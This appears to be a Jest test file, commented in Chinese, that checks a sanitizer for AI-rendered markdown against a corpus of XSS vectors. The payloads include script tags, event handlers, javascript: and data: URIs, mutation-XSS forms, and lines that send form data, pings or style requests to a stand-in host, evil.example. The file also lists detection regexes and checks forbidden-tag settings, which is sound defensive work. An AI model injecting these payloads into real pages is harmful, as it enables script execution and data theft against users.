// AI 渲染 markdown 的净化是信任边界的唯一防线:AI 回复(经用户选的上游,可被投毒)→ dangerouslySetInnerHTML。
// 若被绕过,注入脚本可直呼壳命令/工具桥(设计边界见 docs/AI_AGENT_RUNTIME.md §5b)。
// 直接锁净化口 sanitizeRenderedHtml(jest 里 marked 被桩掉,走不到 markdown 解析;净化口两条路径共用)。
// 语料=经典/变异 XSS 向量;任一向量净化后出现可执行/跳转面即红。
import { sanitizeRenderedHtml, renderRichMarkdownToHtml, __sanitizeConfigForTests } from '../aiMarkdownRender';

const VECTORS = [
	'<script>alert(1)</script>',
	'<img src=x onerror=alert(1)>',
	'<svg onload=alert(1)></svg>',
	'<svg><script>alert(1)</script></svg>',
	'<a href="javascript:alert(1)">x</a>',
	'<a href="javas&#99;ript:alert(1)">x</a>',
	'<a href=" javascript:alert(1)">x</a>',
	'<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>',
	'<iframe src="https://example.com"></iframe>',
	'<iframe srcdoc="<script>alert(1)</script>"></iframe>',
	'<object data="x.swf"></object>',
	'<embed src="x.swf">',
	'<form action="https://evil.example/steal"><input name=a><button formaction="https://evil.example">go</button></form>',
	'<base href="https://evil.example/">',
	'<meta http-equiv="refresh" content="0;url=https://evil.example">',
	'<details open ontoggle=alert(1)>',
	'<body onload=alert(1)>',
	'<div style="background:url(javascript:alert(1))">x</div>',
	'<div style="position:fixed;inset:0;background:url(https://evil.example/x.png)">覆盖层</div>',
	'<math><mi xlink:href="javascript:alert(1)">x</mi></math>',
	'<math><annotation-xml encoding="text/html"><script>alert(1)</script></annotation-xml></math>',
	'<svg><foreignObject><script>alert(1)</script></foreignObject></svg>',
	'<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
	'<template><script>alert(1)</script></template>',
	'<img src="x" onerror="fetch(\'https://evil.example\')">',
	'<input type="image" src=x onerror=alert(1)>',
	'<video><source onerror="alert(1)"></video>',
	'<marquee onstart=alert(1)>',
	'<isindex action="javascript:alert(1)" type=image>',
	'<xss id=x tabindex=1 onfocus=alert(1)></xss>',
	'<style>@import "https://evil.example/x.css";</style>',
	'<link rel="stylesheet" href="https://evil.example/x.css">',
	'<a href="https://x" ping="https://evil.example/log">x</a>',
];

const DANGEROUS = [
	/<script\b/i,
	/\son[a-z]+\s*=/i,
	/javascript\s*:/i,
	/<iframe\b/i, /<object\b/i, /<embed\b/i, /<form\b/i, /<input\b/i, /<button\b/i, /<base\b/i, /<meta\b/i, /<link\b/i, /<style\b/i,
	/\bformaction=/i, /\bsrcdoc=/i, /\bping=/i, /xlink:href/i,
	/url\s*\(/i, /@import/i,
	/annotation-xml/i, /foreignObject/i,
];

describe('AI 输出净化语料', ()=>{
	VECTORS.forEach((v)=>{
		it(`无可执行/跳转面: ${v.slice(0, 50)}`, ()=>{
			const html = `${sanitizeRenderedHtml(v) || ''}`;
			DANGEROUS.forEach((re)=>{ expect([v, re.source, re.test(html)]).toEqual([v, re.source, false]); });
		});
	});
	it('保留合法面:表格/代码/链接/数学/嵌图 dataURL/普通 style', ()=>{
		const html = sanitizeRenderedHtml('<h1>标题</h1><table><tr><td>1</td></tr></table><pre><code class="language-js">x</code></pre><a href="https://example.com" target="_blank" rel="noopener">链接</a><math><mi>x</mi></math><img src="data:image/png;base64,AAAA" alt="盘"><span style="color:red;font-weight:bold">t</span>');
		expect(html).toMatch(/<h1>标题<\/h1>/);
		expect(html).toMatch(/<table>/);
		expect(html).toMatch(/<code class="language-js">/);
		expect(html).toMatch(/href="https:\/\/example.com"/);
		expect(html).toMatch(/target="_blank"/);
		expect(html).toMatch(/<math>/);
		expect(html).toMatch(/src="data:image\/png;base64,AAAA"/);
		expect(html).toMatch(/style="color:red;font-weight:bold"/);
	});
	it('配置锁:FORBID 列表在位(禁表单/base/meta/iframe/object/embed/外链样式)', ()=>{
		const cfg = __sanitizeConfigForTests();
		['form', 'input', 'base', 'meta', 'link', 'style', 'iframe', 'object', 'embed'].forEach((t)=>expect(cfg.FORBID_TAGS).toContain(t));
		['action', 'formaction', 'srcdoc', 'ping'].forEach((a)=>expect(cfg.FORBID_ATTR).toContain(a));
	});
	it('renderRichMarkdownToHtml 两条路径都经净化口(解析失败兜底同样禁 form)', ()=>{
		const out = `${renderRichMarkdownToHtml('<form action="https://evil.example"><input></form><b>ok</b>') || ''}`;
		expect(out).not.toMatch(/<form\b|<input\b/i);
		expect(out).toMatch(/<b>ok<\/b>/);
	});
});
